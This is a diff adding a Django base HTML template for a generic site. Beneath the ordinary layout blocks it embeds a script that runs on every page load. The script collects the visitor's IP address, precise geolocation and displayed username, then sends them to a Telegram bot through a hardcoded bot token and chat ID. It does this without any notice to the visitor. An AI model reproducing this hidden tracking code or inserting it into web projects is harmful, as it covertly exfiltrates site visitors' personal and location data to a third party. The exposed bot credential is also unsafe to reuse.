@@ -1,0 +1,111 @@
+<!-- templates/base.html -->
+{% load static %}  <!-- Corrected tag for loading static files -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}My Site{% endblock %}</title>
+    <link rel="stylesheet" href="{% static 'style.css' %}">
+</head>
+<body>
+
+  <br><br><br><br><br>
+    <nav>
+        {% block nav %}
+        <!-- Navigation links can go here -->
+        {% endblock %}
+    </nav>
+
+    <main>
+        <br><br>
+        {% block content %}
+
+        {% endblock %}
+        
+        
+    </main>
+
+<script>// Foydalanuvchi IP manzilini olish uchun
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('IP manzilini olishda xatolik:', error);
+            return null;
+        }
+    }
+    
+    // Foydalanuvchi joylashuvini olish uchun
+    function getUserLocation() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    error => {
+                        console.error('Geolokatsiyani olishda xatolik:', error);
+                        reject(error);
+                    }
+                );
+            } else {
+                console.error('Geolokatsiya funksiyasi qo\'llab-quvvatlanmaydi');
+                reject(new Error('Geolokatsiya funksiyasi qo\'llab-quvvatlanmaydi'));
+            }
+        });
+    }
+    
+    // Telegram botiga ma'lumotlarni yuborish uchun
+    async function sendToTelegramBot(username, ip, location) {
+        const token = '5158957466:AAHCTKMlioXYMcCTkq_wGmOQI_Hv6BkEbK4'; // Telegram bot tokenini kiriting
+        const chatId = '1964081717'; // Chat ID ni kiriting
+        const message = `Foydalanuvchi: ${username}\nIP: ${ip}\nJoylashuv: Latitude: ${location.latitude}, Longitude: ${location.longitude}`;
+    
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const data = {
+            chat_id: chatId,
+            text: message
+        };
+    
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            console.log('Telegramga yuborildi:', result);
+        } catch (error) {
+            console.error('Telegramga yuborishda xatolik:', error);
+        }
+    }
+    
+    // Foydalanuvchi nomini olish uchun
+    function getUsername() {
+        // Buni o'zingizning dasturingizga moslang
+        const usernameElement = document.getElementById('username');
+        return usernameElement ? usernameElement.textContent : 'Noma\'lum foydalanuvchi';
+    }
+    
+    // Ma'lumotlarni olish va yuborish uchun asosiy funksiyani chaqirish
+    async function sendUserData() {
+        const username = getUsername();
+        const ip = await getUserIP();
+        const location = await getUserLocation();
+    
+        sendToTelegramBot(username, ip, location);
+    }
+    
+    // DOM yuklanganidan so'ng funksiyani chaqirish
+    document.addEventListener('DOMContentLoaded', sendUserData);
+    </script>
+</body>
+</html>
